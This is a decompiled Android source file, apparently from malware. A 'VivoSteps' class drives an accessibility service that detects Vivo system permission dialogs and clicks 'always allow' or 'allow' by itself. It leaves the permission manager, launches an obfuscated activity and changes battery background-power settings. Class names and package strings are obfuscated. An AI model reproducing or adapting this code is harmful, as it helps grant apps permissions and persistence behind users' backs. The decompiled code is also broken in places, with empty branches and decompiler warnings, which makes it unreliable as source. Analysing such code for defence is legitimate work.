                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a817 = c0371a834;
                zBooleanValue2 = ((Boolean) objM212430f82).booleanValue();
                c0371a816 = c0371a817;
                if (!zBooleanValue2) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                C0371a8 c0371a835 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a816 = c0371a835;
                zBooleanValue2 = ((Boolean) objM212430f82).booleanValue();
                if (!zBooleanValue2) {
                }
                break;
            case 16:
                C0371a8 c0371a836 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a820 = c0371a836;
                c0371a820.f55142a3.m214997b2(vivoSteps$FlowType);
                c0371a818 = c0371a820;
                t60.m214704c5(c0371a818.f55141a2, "[后台弹窗] 🧹 关闭权限管理器页面...");
                c0371a819 = c0371a818;
                i9 = 1;
                i10 = 4;
                if (i9 < i10) {
                }
                return coroutineSingletons;
            case 17:
                i9 = vivoSteps$executeBackgroundPopupInternal$1.f54826a1;
                c0371a819 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                i10 = 4;
                AccessibilityNodeInfo rootInActiveWindow2 = c0371a819.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow2 == null || (packageName2 = rootInActiveWindow2.getPackageName()) == null || (string2 = packageName2.toString()) == null) {
                    string2 = "";
                }
                if (rootInActiveWindow2 != null) {
                    rootInActiveWindow2.recycle();
                }
                if (AbstractC0779a1.m213652a5(string2, "permissionmanager", true)) {
                    i9++;
                    if (i9 < i10) {
                    }
                    return coroutineSingletons;
                }
                tz0.m214806a6("[后台弹窗] ✅ 已离开权限管理器 (第", i9, "次返回)", c0371a819.f55141a2);
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a819;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 18;
                if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 18:
                C0371a8 c0371a837 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$executeBackgroundPopupInternal$12 = vivoSteps$executeBackgroundPopupInternal$1;
                c0371a821 = c0371a837;
                Intent intent2 = new Intent(c0371a821.f55140a1, (Class<?>) iuzxujjtqev.class);
                intent2.setFlags(268468224);
                c0371a821.f55140a1.startActivity(intent2);
                vivoSteps$executeBackgroundPopupInternal$12.f54825a0 = c0371a821;
                vivoSteps$executeBackgroundPopupInternal$12.f54830a5 = 19;
                vivoSteps$executeBackgroundPopupInternal$1 = c0371a821;
                break;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                C0371a8 c0371a838 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$executeBackgroundPopupInternal$1 = c0371a838;
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:106:0x02a8, code lost:
    
        if (p000.b81.m210571b1(200, r2) == r3) goto L107;
     */
    /* JADX WARN: Not initialized variable reg: 15, insn: 0x0079: MOVE (r9 I:??[OBJECT, ARRAY]) = (r15 I:??[OBJECT, ARRAY]) (LINE:122), block:B:22:0x0079 */
    /* JADX WARN: Removed duplicated region for block: B:44:0x011f A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:13:0x0041, B:42:0x0115, B:44:0x011f, B:47:0x012c, B:49:0x0139, B:51:0x0143, B:53:0x0149, B:59:0x015c, B:60:0x015f, B:62:0x016b, B:64:0x0187, B:65:0x018c, B:70:0x01b2, B:72:0x01ba, B:74:0x01c3, B:76:0x01cb, B:78:0x01d7, B:80:0x01e3, B:82:0x01ef, B:84:0x01f7, B:88:0x0202, B:92:0x0221, B:108:0x02ab, B:93:0x022a, B:100:0x0253, B:102:0x0259, B:105:0x028f, B:99:0x024b, B:34:0x00ce, B:41:0x0101), top: B:114:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0221 A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:13:0x0041, B:42:0x0115, B:44:0x011f, B:47:0x012c, B:49:0x0139, B:51:0x0143, B:53:0x0149, B:59:0x015c, B:60:0x015f, B:62:0x016b, B:64:0x0187, B:65:0x018c, B:70:0x01b2, B:72:0x01ba, B:74:0x01c3, B:76:0x01cb, B:78:0x01d7, B:80:0x01e3, B:82:0x01ef, B:84:0x01f7, B:88:0x0202, B:92:0x0221, B:108:0x02ab, B:93:0x022a, B:100:0x0253, B:102:0x0259, B:105:0x028f, B:99:0x024b, B:34:0x00ce, B:41:0x0101), top: B:114:0x0028 }] */
    /* JADX WARN: Removed duplicated region for block: B:99:0x024b A[Catch: Exception -> 0x0050, TryCatch #0 {Exception -> 0x0050, blocks: (B:13:0x0041, B:42:0x0115, B:44:0x011f, B:47:0x012c, B:49:0x0139, B:51:0x0143, B:53:0x0149, B:59:0x015c, B:60:0x015f, B:62:0x016b, B:64:0x0187, B:65:0x018c, B:70:0x01b2, B:72:0x01ba, B:74:0x01c3, B:76:0x01cb, B:78:0x01d7, B:80:0x01e3, B:82:0x01ef, B:84:0x01f7, B:88:0x0202, B:92:0x0221, B:108:0x02ab, B:93:0x022a, B:100:0x0253, B:102:0x0259, B:105:0x028f, B:99:0x024b, B:34:0x00ce, B:41:0x0101), top: B:114:0x0028 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:68:0x01a8 -> B:69:0x01aa). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:91:0x021f -> B:69:0x01aa). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:96:0x0246 -> B:97:0x0247). Please report as a decompilation issue!!! */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212397b5(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeBasicPermissions$1 vivoSteps$executeBasicPermissions$1;
        C0371a8 c0371a8;
        C0371a8 c0371a82;
        long j;
        long j2;
        int i;
        int i2;
        int i3;
        int i4;
        long j3;
        long j4;
        int i5;
        int i6;
        int i7;
        C0371a8 c0371a83;
        String str;
        String str2;
        int i8;
        AccessibilityNodeInfo accessibilityNodeInfo;
        String str3;
        CharSequence packageName;
        String string;
        if (continuationImpl instanceof VivoSteps$executeBasicPermissions$1) {
            vivoSteps$executeBasicPermissions$1 = (VivoSteps$executeBasicPermissions$1) continuationImpl;
            int i9 = vivoSteps$executeBasicPermissions$1.f54840a9;
            if ((i9 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBasicPermissions$1.f54840a9 = i9 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeBasicPermissions$1 = new VivoSteps$executeBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$executeBasicPermissions$1.f54838a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        String str4 = "╚══════════════════════════════════════════════════════════════";
        String str5 = "╔══════════════════════════════════════════════════════════════";
        try {
            try {
                switch (vivoSteps$executeBasicPermissions$1.f54840a9) {
                    case 0:
                        kg1.m213544f4(obj);
                        String str6 = this.f55141a2;
                        t60.m214704c5(str6, "");
                        t60.m214704c5(str6, "╔══════════════════════════════════════════════════════════════");
                        t60.m214704c5(str6, "║ ★★★ 基础权限开始 ★★★");
                        t60.m214704c5(str6, "╚══════════════════════════════════════════════════════════════");
                        try {
                            t60.m214704c5(str6, "[基础权限] 启动umrkmgrri...");
                            umrkmgrri.f55158a3.start(this.f55140a1);
                            vivoSteps$executeBasicPermissions$1.f54831a0 = this;
                            vivoSteps$executeBasicPermissions$1.f54840a9 = 1;
                            if (b81.m210571b1(500L, vivoSteps$executeBasicPermissions$1) != coroutineSingletons) {
                                c0371a82 = this;
                                long jCurrentTimeMillis = System.currentTimeMillis();
                                t60.m214704c5(c0371a82.f55141a2, "[基础权限] 开始循环检测");
                                j = jCurrentTimeMillis;
                                j2 = 60000;
                                i = 0;
                                i2 = 0;
                                i3 = 0;
                                i4 = 0;
                                if (System.currentTimeMillis() - j < j2) {
                                    i4++;
                                    if (umrkmgrri.f55158a3.isRequestingPermissions() || i4 <= 5) {
                                        dqtvuisjd dqtvuisjdVar = c0371a82.f55139a0;
                                        String str7 = c0371a82.f55141a2;
                                        AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                                        if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                                            accessibilityNodeInfo = rootInActiveWindow;
                                            str3 = "";
                                        } else {
                                            accessibilityNodeInfo = rootInActiveWindow;
                                            str3 = string;
                                        }
                                        if (accessibilityNodeInfo != null) {
                                            accessibilityNodeInfo.recycle();
                                        }
                                        str = str4;
                                        str2 = str5;
                                        if (c0371a82.m212418e6()) {
                                            t60.m214704c5(str7, "[基础权限] 🔔 检测到通知权限弹窗，包名: " + str3);
                                            if (!c0371a82.m212392a9("始终允许")) {
                                                c0371a82.m212392a9("允许");
                                            }
                                            i++;
                                            vivoSteps$executeBasicPermissions$1.f54831a0 = c0371a82;
                                            vivoSteps$executeBasicPermissions$1.f54832a1 = i;
                                            vivoSteps$executeBasicPermissions$1.f54833a2 = 0;
                                            vivoSteps$executeBasicPermissions$1.f54834a3 = i4;
                                            vivoSteps$executeBasicPermissions$1.f54835a4 = 0;
                                            vivoSteps$executeBasicPermissions$1.f54836a5 = j;
                                            vivoSteps$executeBasicPermissions$1.f54837a6 = j2;
                                            vivoSteps$executeBasicPermissions$1.f54840a9 = 2;
                                            if (b81.m210571b1(300L, vivoSteps$executeBasicPermissions$1) == coroutineSingletons) {
                                            }
                                            i2 = 0;
                                            i3 = 0;
                                        } else if (str3.equals("com.android.permissioncontroller") || AbstractC0779a1.m213652a5(str3, "permission", false) || AbstractC0779a1.m213652a5(str3, "packageinstaller", false) || str3.equals(StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=")) || str3.equals(StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI")) || str3.equals(StringUtil.m212470a0("KFYcdFsxGiEZMClc")) || str3.equals("android") || c0371a82.m212416e4()) {
                                            if (!c0371a82.m212390a7()) {
                                                vivoSteps$executeBasicPermissions$1.f54831a0 = c0371a82;
                                                vivoSteps$executeBasicPermissions$1.f54832a1 = i;
                                                vivoSteps$executeBasicPermissions$1.f54833a2 = 0;
                                                vivoSteps$executeBasicPermissions$1.f54834a3 = i4;
                                                vivoSteps$executeBasicPermissions$1.f54835a4 = 0;
                                                vivoSteps$executeBasicPermissions$1.f54836a5 = j;
                                                vivoSteps$executeBasicPermissions$1.f54837a6 = j2;
                                                vivoSteps$executeBasicPermissions$1.f54840a9 = 4;
                                                break;
                                            } else {
                                                i++;
                                                t60.m214704c5(str7, "[基础权限] ✅ 第" + i + "次点击成功");
                                                vivoSteps$executeBasicPermissions$1.f54831a0 = c0371a82;
                                                vivoSteps$executeBasicPermissions$1.f54832a1 = i;
                                                vivoSteps$executeBasicPermissions$1.f54833a2 = 0;
                                                vivoSteps$executeBasicPermissions$1.f54834a3 = i4;
                                                vivoSteps$executeBasicPermissions$1.f54835a4 = 0;
                                                vivoSteps$executeBasicPermissions$1.f54836a5 = j;
                                                vivoSteps$executeBasicPermissions$1.f54837a6 = j2;
                                                vivoSteps$executeBasicPermissions$1.f54840a9 = 3;
                                                if (b81.m210571b1(300L, vivoSteps$executeBasicPermissions$1) == coroutineSingletons) {
                                                }
                                                i2 = 0;
                                                i3 = 0;
                                            }
                                        } else if (i > 0) {
                                            i2++;
                                            vivoSteps$executeBasicPermissions$1.f54831a0 = c0371a82;
                                            vivoSteps$executeBasicPermissions$1.f54832a1 = i;
                                            vivoSteps$executeBasicPermissions$1.f54833a2 = i2;
                                            vivoSteps$executeBasicPermissions$1.f54834a3 = i4;
                                            vivoSteps$executeBasicPermissions$1.f54835a4 = i3;
                                            vivoSteps$executeBasicPermissions$1.f54836a5 = j;
                                            vivoSteps$executeBasicPermissions$1.f54837a6 = j2;
                                            vivoSteps$executeBasicPermissions$1.f54840a9 = 5;
                                            if (b81.m210571b1(500L, vivoSteps$executeBasicPermissions$1) == coroutineSingletons) {
                                            }
                                            if (i2 >= 3) {
                                                t60.m214704c5(c0371a82.f55141a2, "[基础权限] ✅ 连续3次非权限页面，判定完成");
                                                umrkmgrri.f55158a3.setRequestingPermissions(false);
                                                long jCurrentTimeMillis2 = (System.currentTimeMillis() - j) / 1000;
                                                String str8 = c0371a82.f55141a2;
                                                t60.m214704c5(str8, "");
                                                t60.m214704c5(str8, str2);
                                                t60.m214704c5(str8, "║ ★★★ 基础权限完成 ★★★");
                                                t60.m214704c5(str8, "║ 📊 总用时: " + jCurrentTimeMillis2 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                                                t60.m214704c5(str8, str);
                                                return Boolean.TRUE;
                                            }
                                        } else {
                                            int i10 = i3 + 1;
                                            vivoSteps$executeBasicPermissions$1.f54831a0 = c0371a82;
                                            vivoSteps$executeBasicPermissions$1.f54832a1 = i;
                                            vivoSteps$executeBasicPermissions$1.f54833a2 = i2;
                                            vivoSteps$executeBasicPermissions$1.f54834a3 = i4;
                                            vivoSteps$executeBasicPermissions$1.f54835a4 = i10;
                                            vivoSteps$executeBasicPermissions$1.f54836a5 = j;
                                            vivoSteps$executeBasicPermissions$1.f54837a6 = j2;
                                            vivoSteps$executeBasicPermissions$1.f54840a9 = 6;
                                            if (b81.m210571b1(500L, vivoSteps$executeBasicPermissions$1) != coroutineSingletons) {
                                                i3 = i10;
                                                if (i3 >= 10) {
                                                    t60.m214704c5(c0371a82.f55141a2, "[基础权限] ✅ 无权限弹窗，权限已全部处理");
                                                    umrkmgrri.f55158a3.setRequestingPermissions(false);
                                                    long jCurrentTimeMillis22 = (System.currentTimeMillis() - j) / 1000;
                                                    String str82 = c0371a82.f55141a2;
                                                    t60.m214704c5(str82, "");
                                                    t60.m214704c5(str82, str2);
                                                    t60.m214704c5(str82, "║ ★★★ 基础权限完成 ★★★");
                                                    t60.m214704c5(str82, "║ 📊 总用时: " + jCurrentTimeMillis22 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                                                    t60.m214704c5(str82, str);
                                                    return Boolean.TRUE;
                                                }
                                            }
                                        }
                                        str4 = str;
                                        str5 = str2;
                                        if (System.currentTimeMillis() - j < j2) {
                                        }
                                    } else {
                                        t60.m214704c5(c0371a82.f55141a2, "[基础权限] ✅ Activity已关闭，权限处理完成");
                                    }
                                }
                                str = str4;
                                str2 = str5;
                                umrkmgrri.f55158a3.setRequestingPermissions(false);
                                long jCurrentTimeMillis222 = (System.currentTimeMillis() - j) / 1000;
                                String str822 = c0371a82.f55141a2;
                                t60.m214704c5(str822, "");
                                t60.m214704c5(str822, str2);
                                t60.m214704c5(str822, "║ ★★★ 基础权限完成 ★★★");
                                t60.m214704c5(str822, "║ 📊 总用时: " + jCurrentTimeMillis222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                                t60.m214704c5(str822, str);
                                return Boolean.TRUE;
                            }
                            return coroutineSingletons;
                        } catch (Exception e) {
                            e = e;
                            c0371a82 = this;
                            tz0.m214807a7("[基础权限] ❌ 失败: ", e.getMessage(), c0371a82.f55141a2);
                            return Boolean.FALSE;
                        }
                    case 1:
                        c0371a82 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        long jCurrentTimeMillis3 = System.currentTimeMillis();
                        t60.m214704c5(c0371a82.f55141a2, "[基础权限] 开始循环检测");
                        j = jCurrentTimeMillis3;
                        j2 = 60000;
                        i = 0;
                        i2 = 0;
                        i3 = 0;
                        i4 = 0;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis2222 = (System.currentTimeMillis() - j) / 1000;
                        String str8222 = c0371a82.f55141a2;
                        t60.m214704c5(str8222, "");
                        t60.m214704c5(str8222, str2);
                        t60.m214704c5(str8222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str8222, "║ 📊 总用时: " + jCurrentTimeMillis2222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str8222, str);
                        return Boolean.TRUE;
                    case 2:
                        j3 = vivoSteps$executeBasicPermissions$1.f54837a6;
                        j4 = vivoSteps$executeBasicPermissions$1.f54836a5;
                        i5 = vivoSteps$executeBasicPermissions$1.f54835a4;
                        i6 = vivoSteps$executeBasicPermissions$1.f54834a3;
                        i7 = vivoSteps$executeBasicPermissions$1.f54833a2;
                        int i11 = vivoSteps$executeBasicPermissions$1.f54832a1;
                        c0371a83 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        str = "╚══════════════════════════════════════════════════════════════";
                        str2 = "╔══════════════════════════════════════════════════════════════";
                        i = i11;
                        long j5 = j3;
                        i3 = i5;
                        i2 = i7;
                        long j6 = j4;
                        i4 = i6;
                        j2 = j5;
                        c0371a82 = c0371a83;
                        j = j6;
                        str4 = str;
                        str5 = str2;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis22222 = (System.currentTimeMillis() - j) / 1000;
                        String str82222 = c0371a82.f55141a2;
                        t60.m214704c5(str82222, "");
                        t60.m214704c5(str82222, str2);
                        t60.m214704c5(str82222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str82222, "║ 📊 总用时: " + jCurrentTimeMillis22222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str82222, str);
                        return Boolean.TRUE;
                    case 3:
                        j3 = vivoSteps$executeBasicPermissions$1.f54837a6;
                        j4 = vivoSteps$executeBasicPermissions$1.f54836a5;
                        i5 = vivoSteps$executeBasicPermissions$1.f54835a4;
                        i6 = vivoSteps$executeBasicPermissions$1.f54834a3;
                        i7 = vivoSteps$executeBasicPermissions$1.f54833a2;
                        i8 = vivoSteps$executeBasicPermissions$1.f54832a1;
                        c0371a83 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        str = "╚══════════════════════════════════════════════════════════════";
                        str2 = "╔══════════════════════════════════════════════════════════════";
                        i = i8;
                        long j52 = j3;
                        i3 = i5;
                        i2 = i7;
                        long j62 = j4;
                        i4 = i6;
                        j2 = j52;
                        c0371a82 = c0371a83;
                        j = j62;
                        str4 = str;
                        str5 = str2;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis222222 = (System.currentTimeMillis() - j) / 1000;
                        String str822222 = c0371a82.f55141a2;
                        t60.m214704c5(str822222, "");
                        t60.m214704c5(str822222, str2);
                        t60.m214704c5(str822222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str822222, "║ 📊 总用时: " + jCurrentTimeMillis222222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str822222, str);
                        return Boolean.TRUE;
                    case 4:
                        j3 = vivoSteps$executeBasicPermissions$1.f54837a6;
                        j4 = vivoSteps$executeBasicPermissions$1.f54836a5;
                        i5 = vivoSteps$executeBasicPermissions$1.f54835a4;
                        i6 = vivoSteps$executeBasicPermissions$1.f54834a3;
                        i7 = vivoSteps$executeBasicPermissions$1.f54833a2;
                        i8 = vivoSteps$executeBasicPermissions$1.f54832a1;
                        c0371a83 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        str = "╚══════════════════════════════════════════════════════════════";
                        str2 = "╔══════════════════════════════════════════════════════════════";
                        i = i8;
                        long j522 = j3;
                        i3 = i5;
                        i2 = i7;
                        long j622 = j4;
                        i4 = i6;
                        j2 = j522;
                        c0371a82 = c0371a83;
                        j = j622;
                        str4 = str;
                        str5 = str2;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis2222222 = (System.currentTimeMillis() - j) / 1000;
                        String str8222222 = c0371a82.f55141a2;
                        t60.m214704c5(str8222222, "");
                        t60.m214704c5(str8222222, str2);
                        t60.m214704c5(str8222222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str8222222, "║ 📊 总用时: " + jCurrentTimeMillis2222222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str8222222, str);
                        return Boolean.TRUE;
                    case 5:
                        long j7 = vivoSteps$executeBasicPermissions$1.f54837a6;
                        long j8 = vivoSteps$executeBasicPermissions$1.f54836a5;
                        int i12 = vivoSteps$executeBasicPermissions$1.f54835a4;
                        int i13 = vivoSteps$executeBasicPermissions$1.f54834a3;
                        int i14 = vivoSteps$executeBasicPermissions$1.f54833a2;
                        int i15 = vivoSteps$executeBasicPermissions$1.f54832a1;
                        C0371a8 c0371a84 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        str = "╚══════════════════════════════════════════════════════════════";
                        str2 = "╔══════════════════════════════════════════════════════════════";
                        i = i15;
                        i3 = i12;
                        i2 = i14;
                        i4 = i13;
                        j2 = j7;
                        c0371a82 = c0371a84;
                        j = j8;
                        if (i2 >= 3) {
                        }
                        str4 = str;
                        str5 = str2;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis22222222 = (System.currentTimeMillis() - j) / 1000;
                        String str82222222 = c0371a82.f55141a2;
                        t60.m214704c5(str82222222, "");
                        t60.m214704c5(str82222222, str2);
                        t60.m214704c5(str82222222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str82222222, "║ 📊 总用时: " + jCurrentTimeMillis22222222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str82222222, str);
                        return Boolean.TRUE;
                    case 6:
                        j2 = vivoSteps$executeBasicPermissions$1.f54837a6;
                        j = vivoSteps$executeBasicPermissions$1.f54836a5;
                        int i16 = vivoSteps$executeBasicPermissions$1.f54835a4;
                        int i17 = vivoSteps$executeBasicPermissions$1.f54834a3;
                        int i18 = vivoSteps$executeBasicPermissions$1.f54833a2;
                        int i19 = vivoSteps$executeBasicPermissions$1.f54832a1;
                        c0371a82 = vivoSteps$executeBasicPermissions$1.f54831a0;
                        kg1.m213544f4(obj);
                        str = "╚══════════════════════════════════════════════════════════════";
                        str2 = "╔══════════════════════════════════════════════════════════════";
                        i = i19;
                        i4 = i17;
                        i3 = i16;
                        i2 = i18;
                        if (i3 >= 10) {
                        }
                        str4 = str;
                        str5 = str2;
                        if (System.currentTimeMillis() - j < j2) {
                        }
                        str = str4;
                        str2 = str5;
                        umrkmgrri.f55158a3.setRequestingPermissions(false);
                        long jCurrentTimeMillis222222222 = (System.currentTimeMillis() - j) / 1000;
                        String str822222222 = c0371a82.f55141a2;
                        t60.m214704c5(str822222222, "");
                        t60.m214704c5(str822222222, str2);
                        t60.m214704c5(str822222222, "║ ★★★ 基础权限完成 ★★★");
                        t60.m214704c5(str822222222, "║ 📊 总用时: " + jCurrentTimeMillis222222222 + "秒, 循环: " + i4 + "次, 点击: " + i + "次");
                        t60.m214704c5(str822222222, str);
                        return Boolean.TRUE;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
            } catch (Exception e2) {
                e = e2;
            }
        } catch (Exception e3) {
            e = e3;
            c0371a82 = c0371a8;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:106:0x0288, code lost:
    
        if (r1 != r3) goto L108;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:103:0x026a  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x02a0  */
    /* JADX WARN: Removed duplicated region for block: B:115:0x02aa  */
    /* JADX WARN: Removed duplicated region for block: B:120:0x02c2  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x02ee  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02f0  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x0101  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x010b  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x012b A[PHI: r4 r5
      0x012b: PHI (r4v14 java.lang.String) = (r4v12 java.lang.String), (r4v16 java.lang.String) binds: [B:40:0x0127, B:24:0x00bd] A[DONT_GENERATE, DONT_INLINE]
      0x012b: PHI (r5v6 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v4 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v8 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:40:0x0127, B:24:0x00bd] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x0147  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0153  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x018f  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x01a0  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x01a5  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x01af  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x01b2  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x01d4  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0200  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x020a A[PHI: r4 r6 r9 r10
      0x020a: PHI (r4v32 int) = (r4v21 int), (r4v26 int), (r4v33 int) binds: [B:71:0x01b0, B:76:0x01d2, B:85:0x0201] A[DONT_GENERATE, DONT_INLINE]
      0x020a: PHI (r6v10 com.storm.safe.rock.service.modules.yw5xud.a8) = 
      (r6v5 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r6v8 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r6v11 com.storm.safe.rock.service.modules.yw5xud.a8)
     binds: [B:71:0x01b0, B:76:0x01d2, B:85:0x0201] A[DONT_GENERATE, DONT_INLINE]
      0x020a: PHI (r9v13 int) = (r9v3 int), (r9v7 int), (r9v15 int) binds: [B:71:0x01b0, B:76:0x01d2, B:85:0x0201] A[DONT_GENERATE, DONT_INLINE]
      0x020a: PHI (r10v13 java.lang.String) = (r10v5 java.lang.String), (r10v8 java.lang.String), (r10v15 java.lang.String) binds: [B:71:0x01b0, B:76:0x01d2, B:85:0x0201] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:87:0x020c  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0231  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x025c  */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212398b6(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeBatteryBackgroundPower$1 vivoSteps$executeBatteryBackgroundPower$1;
        String str2;
        Object objM212393b0;
        C0371a8 c0371a8;
        String str3;
        String str4;
        C0371a8 c0371a82;
        int i;
        int i2;
        int i3;
        AccessibilityNodeInfo rootInActiveWindow;
        Object[] objArr;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        Iterator<T> it;
        String str5;
        C0371a8 c0371a83;
        C0371a8 c0371a84;
        int i4;
        String str6;
        C0371a8 c0371a85;
        int i5;
        C0371a8 c0371a86;
        C0371a8 c0371a87;
        if (continuationImpl instanceof VivoSteps$executeBatteryBackgroundPower$1) {
            vivoSteps$executeBatteryBackgroundPower$1 = (VivoSteps$executeBatteryBackgroundPower$1) continuationImpl;
            int i6 = vivoSteps$executeBatteryBackgroundPower$1.f54847a6;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = i6 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeBatteryBackgroundPower$1 = new VivoSteps$executeBatteryBackgroundPower$1(this, continuationImpl);
            }
        }
        Object objM212430f8 = vivoSteps$executeBatteryBackgroundPower$1.f54845a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = 0;
        switch (vivoSteps$executeBatteryBackgroundPower$1.f54847a6) {
            case 0:
                kg1.m213544f4(objM212430f8);
                t60.m214704c5(this.f55141a2, "[电池-后台耗电] ========== 开始处理后台耗电设置 ==========");
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = this;
                str2 = str;
                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str2;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 1;
                objM212393b0 = m212393b0("后台耗电管理#后台高耗电", Buffer.SEGMENTING_THRESHOLD, 3, vivoSteps$executeBatteryBackgroundPower$1);
                if (objM212393b0 != coroutineSingletons) {
                    c0371a8 = this;
                    if (((Boolean) objM212393b0).booleanValue()) {
